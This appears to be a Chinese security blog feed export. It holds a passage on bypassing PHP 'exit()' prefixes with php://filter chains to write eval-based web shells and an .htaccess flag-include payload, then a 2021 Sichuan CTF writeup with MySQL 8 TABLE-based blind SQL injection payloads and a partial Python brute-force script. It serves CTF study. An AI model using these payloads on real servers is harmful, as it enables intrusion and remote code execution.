在页面底部加载文件<br></code></pre></td></tr></table></figure><p>使用这种方法可以不需要改动任何页面，当需要修改顶部或底部<code>require</code>文件时，只需要修改<code>auto_prepend_file</code>与<code>auto_append_file</code>的值即可。</p><p>例如：修改<code>php.ini</code>，修改<code>auto_prepend_file</code>与<code>auto_append_file</code>的值。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span> = <span class="hljs-string">&quot;/home/fdipzone/header.php&quot;</span><br><span class="hljs-attr">auto_append_file</span> = <span class="hljs-string">&quot;/home/fdipzone/footer.php&quot;</span><br></code></pre></td></tr></table></figure><p>修改后重启服务器，这样所有页面的顶部与底部都会<code>require /home/fdipzone/header.php</code>与 <code>/home/fdipzone/footer.php</code></p><p>如果不需要所有页面都在顶部或底部<code>require</code>文件，可以指定某一个文件夹内的页面文件才调用<code>auto_prepend_file</code>与<code>auto_append_file</code><br>在需要顶部或底部加载文件的文件夹中加入<code>.htaccess</code>文件，内容如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">php_value</span> auto_prepend_file <span class="hljs-string">&quot;/home/fdipzone/header.php&quot;</span><br>php_value auto_append_file <span class="hljs-string">&quot;/home/fdipzone/footer.php&quot;</span><br></code></pre></td></tr></table></figure><p>这样在指定<code>.htaccess</code>的文件夹内的页面文件才会加载<code>/home/fdipzone/header.php</code>与<code>/home/fdipzone/footer.php</code>，其他页面文件不受影响。</p><p>自定义包含我们的flag文件。</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.strip_tags/</span>resource=.htaccess&amp;content=?&gt;php_value auto_prepend_file <span class="hljs-string">&quot;/flag&quot;</span><br></code></pre></td></tr></table></figure><p>首先来解释<code>$filename</code>的代码，这里引用了<code>string.strip_tags</code>过滤器，可以过滤<code>.htaccess</code>内容的<code>html</code>标签，自然也就消除了死亡代码；<code>$content</code>即闭合死亡代码使其完全消除，并且写入自定义包含文件；</p><h3 id="bypass相同变量"><a href="#bypass相同变量" class="headerlink" title="bypass相同变量"></a>bypass相同变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[content];<br>file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容<code>exit</code>这个关键代码写入<code>shell</code>后门。</p><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">content=php:<span class="hljs-comment">//filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php</span><br><br>或<br><br>content=php:<span class="hljs-comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span><br></code></pre></td></tr></table></figure><p>进行拼接之后就是 <code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code> 然后会对其进行一次整体的 <code>base64-decode</code> 。从而分解掉死亡代码，</p><p>但是无法生成<code>content</code>；虽然文件创建成功，但是就是无法生成<code>content</code>。问题在于<code>resource</code>后边的 <code>=</code>；</p><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/252.png?raw=true" alt="a"></p><p><code>‘=’</code>在<code>base64</code>中的作用是填充，也就是以为着结束；在<code>‘=’</code>的后面是不允许有任何其他字符的否则会报错，</p><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/253.png?raw=true" alt="a"></p><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/254.png?raw=true" alt="a"></p><p>这里因为是由于<code>‘=’</code>从而使得我们写入<code>content</code>不成功，那么我们可以想个方法去掉等号即可，</p><p>去掉等号之过滤器嵌套base64</p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">content</span>=php://filter/string.strip_tags|convert.base<span class="hljs-number">64</span>-decode/resource=?&gt;PD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+.php<br></code></pre></td></tr></table></figure><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/255.png?raw=true" alt="a"></p><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/256.png?raw=true" alt="a"></p><p>发现可以生成文件，并且可以看到我们已经成功写入了<code>shell</code>；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p><p>payoad:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">content=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags|convert.base64-decode/</span>resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>b<span class="hljs-regexp">/../</span>shell.php<br></code></pre></td></tr></table></figure><p>注意：这里<code>%2b</code>是<code>+</code>号的url编码，不进行编码会被当成空格处理</p><p>我们将前面的一串<code>base64</code>字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成<code>shell.php</code>文件；从而就可以生成正常的文件名.</p><p>或者去掉等号之直接对内容进行变性另类<code>base64</code></p><p>其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的<code>html</code>标签，从而对剩下的内容进行<code>base64</code>解码。但是这种方法却不是如此，payload如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/&lt;?|string.strip_tags|convert.base64-decode/</span>resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>b<span class="hljs-regexp">/../</span>shell.php<br></code></pre></td></tr></table></figure><p>这种<code>payload</code>的攻击原理即是首先直接在内容时，就将我们<code>base64</code>遇到的<code>‘=’</code>这个问题直接写在<code>&lt;? ?&gt;</code>中进行过滤掉，然后<code>base64-decode</code>再对原本内容的<code>&lt;?php exit();</code>进行转码，从而达到分解死亡代码的效果</p><h4 id="rot13绕过-1"><a href="#rot13绕过-1" class="headerlink" title="rot13绕过"></a>rot13绕过</h4><p>尽管<code>base64</code>比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可；</p><p>payload：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">content=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=<span class="hljs-built_in">shell</span>.php<br><br>content=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13/resource=<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>/../<span class="hljs-built_in">shell</span>.php<br></code></pre></td></tr></table></figure><p>生成文件内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>cuc rkvg();cuc:<span class="hljs-comment">//svygre/jevgr=fgevat.ebg13|<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span>|/erfbhepr=f1zcyr.cuc</span><br></code></pre></td></tr></table></figure><p>其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码；</p><h4 id="convert-iconv-1"><a href="#convert-iconv-1" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><p>对于<code>iconv</code>字符编码转换进行绕过的手法，其实类似于上面所述的<code>base64</code>编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。</p><ul><li><strong>usc-2</strong></li></ul><p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> iconv(<span class="hljs-string">&quot;UCS-2LE&quot;</span>,<span class="hljs-string">&quot;UCS-2BE&quot;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?/resource=shell.php</span><br></code></pre></td></tr></table></figure><p>成功向 <code>shell.php</code> 写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?&lt;hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[ab]);<span class="hljs-meta">?&gt;</span>r/seuocr=ehsle.l<br></code></pre></td></tr></table></figure><ul><li><strong>usc-4</strong></li></ul><p>通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> iconv(<span class="hljs-string">&quot;UCS-4LE&quot;</span>,<span class="hljs-string">&quot;UCS-4BE&quot;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[abcd]);?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>28字符 <code>&lt;?php @eval($_POST[abcd]);?&gt;</code> 转为 <code>hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)</code></p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">content</span>=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_<span class="hljs-variable">$a</span>[TS]dcb&gt;?;)/<span class="hljs-attribute">resource</span>=shell.php<br></code></pre></td></tr></table></figure><p>成功写入：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">hp?<span class="hljs-tag">&lt;<span class="hljs-name">xe</span> <span class="hljs-attr">p</span>)(<span class="hljs-attr">tiphp</span>;<span class="hljs-attr">f</span>//<span class="hljs-attr">:etlioc</span>/<span class="hljs-attr">rrevnci.t.vno-SCU.EL4-SCU</span>|<span class="hljs-attr">EB4</span></span></span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[abcd]);<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag"><span class="hljs-attr">ser</span>/<span class="hljs-attr">cruohs</span>=<span class="hljs-string">e.lle</span></span></span><br></code></pre></td></tr></table></figure><ul><li><strong>utf8-utf7</strong></li></ul><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/257.png?raw=true" alt="a"></p><p>这里发现生成的是<code>+AD0-</code>,然而经过检测，此字符串可以被<code>base64</code>进行解码；那也就意味着我们可以使用这种方法避免等号对我们<code>base64</code>解码的影响；我们可以直接写入<code>base64</code>加密后的<code>payload</code>，然后将其进行<code>utf</code>之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的<code>base64-encode</code>之后的编码依然是存在的，然后进行<code>base64-decode</code>一下，写入shell.</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">content=php:<span class="hljs-comment">//filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br></code></pre></td></tr></table></figure><p>ps：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 这里要符合base64 解码按<span class="hljs-number">4</span> 字节进行<br><br>utf8 -&gt; utf-<span class="hljs-number">7</span><br><br>&lt;?php <span class="hljs-keyword">exit</span>();php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=aaaaXDw/</span>cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span>|convert.base64-decode/resource=shell.php<br><br>变为：<br><br>+ADw?php <span class="hljs-keyword">exit</span>()+ADs-php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write+AD0-aaaaXDw/</span>cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+-+AHw-convert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span>+AHw-convert.base64-decode/resource+AD0-shell.php<br><br>base64恶意payload的之前正好<span class="hljs-number">36</span>个字节，所以写入了shell<br><br></code></pre></td></tr></table></figure><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/258.png?raw=true" alt="a"></p><h3 id="VMCTF-Checkin"><a href="#VMCTF-Checkin" class="headerlink" title="VMCTF Checkin"></a>VMCTF Checkin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//PHP 7.0.33 Apache/2.4.25</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_REAL_IP&#x27;</span>]);<br>@mkdir(<span class="hljs-variable">$sandbox</span>);<br>@chdir(<span class="hljs-variable">$sandbox</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$content</span>))<br>         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$content</span>))<br>        <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里主要就是考察过滤器构造绕过</p><p>题目中过滤的过滤器有</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">/iconv|<span class="hljs-type">UCS</span>|<span class="hljs-type">UTF</span>|<span class="hljs-type">rot</span>|<span class="hljs-type">quoted</span>|<span class="hljs-type">base64</span>/<br></code></pre></td></tr></table></figure><p>但是需要注意<code>file_put_contents</code>要调用伪协议，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> php_stream_apply_filter_list(php_stream *stream, char *filterlist, <span class="hljs-keyword">int</span> read_chain, <span class="hljs-keyword">int</span> write_chain) <br>&#123;<br>char *p, *token = <span class="hljs-literal">NULL</span>;<br>php_stream_filter *temp_filter;<br><br>p = php_strtok_r(filterlist, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);<br><span class="hljs-keyword">while</span> (p) &#123;<br>php_url_decode(p, strlen(p));<span class="hljs-comment">#对过滤器进行了一次urldecode</span><br><span class="hljs-keyword">if</span> (read_chain) &#123;<br><span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;<br>php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (write_chain) &#123;<br><span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;<br>php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);<br>&#125;<br>&#125;<br>p = php_strtok_r(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而伪协议处理时会对过滤器 <code>urldecode</code> 一次，所以是可以利用二次编码绕过的，</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/write=string.%7%32ot13|<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=w0s1np.php</span><br></code></pre></td></tr></table></figure><p>注：<code>payload</code>放过滤器的位置或者放文件名位置都可（因为有些编码有时候会有空格什么的乱码，文件名不一定好用），<code>php://filter</code>面对不可用的规则是报个<code>Warning</code>，然后跳过继续执行的）。</p><p>还可以利用压缩过滤器以及加密过滤器：</p><p><code>zlib</code> 的 <code>zlib.deflate</code> 和 <code>zlib.inflate</code> ，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续 <code>inflate</code> 的内容，简单遍历一下可以发现中间插入 <code>string.tolower</code> 转后会把空格和 <code>exit</code> 处理了就可以绕过exit</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span>%0deval($_GET[1]);<span class="hljs-meta">?&gt;</span>/resource=shell.php</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021年四川省大学生网络安全技能大赛  writeup</title>
    <link href="/2021/05/19/2021%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-writeup/"/>
    <url>/2021/05/19/2021%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="2021年四川省大学生网络安全技能大赛-writeup"><a href="#2021年四川省大学生网络安全技能大赛-writeup" class="headerlink" title="2021年四川省大学生网络安全技能大赛  writeup"></a>2021年四川省大学生网络安全技能大赛  writeup</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称：为什么各位师傅都这么强</p><p>战队编号：lx_2b05de</p><p>所属单位：cuit幼儿园</p><p>战队成员姓名：crilwa   Je3Z   w0s1np</p><h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a><strong>二、</strong>解题情况</h2><p><img src="/wzimg/233.png" alt="image-20210515203234703"></p><h2 id="三、-解题过程"><a href="#三、-解题过程" class="headerlink" title="三、 解题过程"></a><strong>三、</strong> 解题过程</h2><h3 id="题目一-EZSQL"><a href="#题目一-EZSQL" class="headerlink" title="题目一 EZSQL"></a>题目一 EZSQL</h3><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>考点：MYSQL8新特性</p><p>fuzz之后发现，只能盲注，过滤了<code>select</code>，使用<code>1&#39; and (ascii(substr(database(),1,1)))&gt;num --+ </code>可以盲注出数据库，但是后面就搞不动了</p><p>无select注入，使用的是table语句。</p><blockquote><p>TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</p></blockquote><p>这个作用是列出表的全部内容，于是就可以利用这个语句来进行注入。</p><p>首先需要知道表名使用MySQL一些自带的特殊表来盲注表</p><blockquote><p>information_schema.TABLESPACES_EXTENSIONS</p></blockquote><p><img src="/wzimg/186.png" alt="图片"></p><p>使用这个语句来一个一个字段的注入出表名，使用这个语句进行注入只能单列查询不能如同联合查询一般使用<code>group_concat</code>来连接要查询的字段。所以只能用<code>limit</code>来限制输出的内容。</p><p><img src="/wzimg/187.png" alt="图片"></p><p>使用盲注将所需的表名注入出来<br><img src="/wzimg/188.png" alt="图片"></p><p>这里两个空位代表着表的两个字段，一张表中有多少个字段就要有多少个空位。</p><p>在注入时还有几个规律要注意：</p><p>首先需要从第一个字段开始猜解数据，如果不按顺序来得到的数据永真。<br><img src="/wzimg/189.png" alt="图片"></p><p><img src="/wzimg/190.png" alt="图片"></p><p>其实第二个字段应该为空，所以需要从第一个字段开始猜解。这是坑点之一，也算是一个难点。</p><p>第二个难点是猜解字符串时<code>true</code>和<code>false</code>的出现时机，在最后一位字符之前都是相同的。</p><p>在前面的字符猜解时，直到正确的字符出现时，ascii码小于或等于这个字符的查询结果永真。</p><p><img src="/wzimg/191.png" alt="图片"></p><p><img src="/wzimg/192.png" alt="图片"></p><p>这个字段的值为<code>mysql</code>因此到<code>m</code>之前的所有字符都为真。<br><img src="/wzimg/193.png" alt="图片"></p><p>直到<code>n</code>这个字符，也就是大于<code>m</code>的才会为假。</p><p>只能使用字符串拼接的方式逐字查询也就是<code>m my mys</code>这样的方式逐步拼接字符串<br><img src="/wzimg/194.png" alt="图片"></p><p>在最后一个字符时规则又跟之前的字符不同，当查询的字符串到达最后一个字符时，ascii码小于这个字符的永真，大于或等于这个字符的才为假。<br><img src="/wzimg/195.png" alt="图片"></p><p><img src="/wzimg/196.png" alt="图片"></p><p>最后一个要点，当第一个字符是正确时后面拼接的字符才能正确判断</p><blockquote><p>mysql&lt;=mysql aasda&lt;=mysql gasdassd &lt;=mysql</p></blockquote><p>这三种情况都是真，第一个字符不正确且结果为真的情况下无论怎么拼接字符串，输出的结果都为真。</p><p>先爆破表数量再注入猜解表名</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)&lt;=(TABLE<span class="hljs-comment">/**/</span>information_schema.TABLESPACES_EXTENSIONS<span class="hljs-comment">/**/</span>LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><p>​                                                                                     <img src="/wzimg/197.png" alt="图片"></p><p><img src="/wzimg/198.png" alt="图片"></p><p><img src="/wzimg/199.png" alt="图片"></p><p>得到表名后再猜字段数 ,一个个加空格直到结果为真</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span>=<span class="hljs-string">&quot;1&#x27;and(&quot;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot;)&lt;=(TABLE/*\**\*/fakeflag/\*\*/limit/**/0,1)--+&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/wzimg/200.png" alt="图片"></p><p><img src="/wzimg/201.png" alt="图片"></p><p>最后就是从第一个字段开始注数据慢慢找flag了。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span>=<span class="hljs-string">&quot;1&#x27;and(4,&quot;</span>fl4gg<span class="hljs-string">&quot;,&quot;</span>&#123;&#125;<span class="hljs-string">&quot;)&lt;=(TABLE/**/fakeflag/**/limit/**/3,1)--+&quot;</span><br></code></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-built_in">ascii</span>=<span class="hljs-string">&quot;/0123456789:;ABCDEFGHIJKLMNOPQRSTUYWXYZ_.abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">url</span>):</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    tablename=<span class="hljs-string">&quot;&quot;</span><br>    j=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> j&lt;=<span class="hljs-number">100</span>:<br>        j+=<span class="hljs-number">1</span><br>        tablename=result<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">ascii</span>:<br><br>            payload=<span class="hljs-string">&quot;1&#x27;and(4,\&quot;fl4gg\&quot;,\&quot;&#123;&#125;\&quot;)&lt;=(TABLE/**/fakeflag/**/limit/**/3,1)--+&quot;</span>.<span class="hljs-built_in">format</span>(tablename+i)<br>            <span class="hljs-comment">#payload=&quot;1&#x27;and(&#x27;&#123;&#125;&#x27;,&#x27;&#x27;)&lt;=(TABLE/**/information_schema.TABLESPACES_EXTENSIONS/**/LIMIT 7,1)--+&quot;.format(tablename+i)</span><br>            re=requests.get(url+payload)<br>            <span 